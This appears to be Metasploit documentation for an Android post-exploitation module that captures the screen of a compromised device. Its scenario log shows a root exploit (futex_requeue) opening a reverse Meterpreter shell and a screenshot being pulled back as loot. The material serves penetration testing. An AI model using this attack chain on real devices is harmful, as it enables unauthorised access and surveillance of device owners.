## Description

  This module takes a screen capture with the Android built-in application to live off the land.
  `shell` or `root` access is required.

## Verification Steps

  1. Start msfconsole
  2. Get `shell` or `root` access on an Android device
  3. Do: ```use post/android/capture/screen```
  4. Do: ```set session [session]```
  5. Do: ```run```
  6. You should get a screen capture saved to your device.

## Options

  **EXE_PATH**

  Path to the `screencap` executable on android device. Default is `/system/bin/screencap`.

  **TMP_PATH**

  Path to temp directory on android device to save the screenshot to temporarily. Default is `/data/local/tmp/`.

## Scenarios

### Samsung Galaxy S3 Verizon (SCH-I535 w/ android 4.4.2, kernel 3.4.0)

Utilizing futex_requeue to get root access.

  ```
msf5 exploit(android/local/futex_requeue) > run

[*] Started reverse TCP handler on 111.111.1.111:4444
[*] Using target: New Samsung
[*] Loading exploit library /data/data/com.metasploit.stage/files/cbvzt
[*] Loaded library /data/data/com.metasploit.stage/files/cbvzt, deleting
[*] Waiting 300 seconds for payload
[*] Sending stage (904600 bytes) to 222.222.2.222
[*] Meterpreter session 4 opened (111.111.1.111:4444 -> 222.222.2.222:58577) at 2019-10-22 16:04:31 -0400

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > background
[*] Backgrounding session 4...
msf5 exploit(android/local/futex_requeue) > use post/android/capture/screen
msf5 post(android/capture/screen) > set session 4
session => 4
msf5 post(android/capture/screen) > run

[!] SESSION may not be compatible with this module.
[+] Downloading screenshot...
[+] Screenshot saved at /root/.msf4/loot/20191022161242_default_222.222.2.222_screen_capture.s_496457.png
[*] Post module execution completed
  ```

![20191022161242_default_192 168 2 14_screen_capture s_496457](https://user-images.githubusercontent.com/752491/67612706-d433ae80-f772-11e9-8344-30020515299e.png)

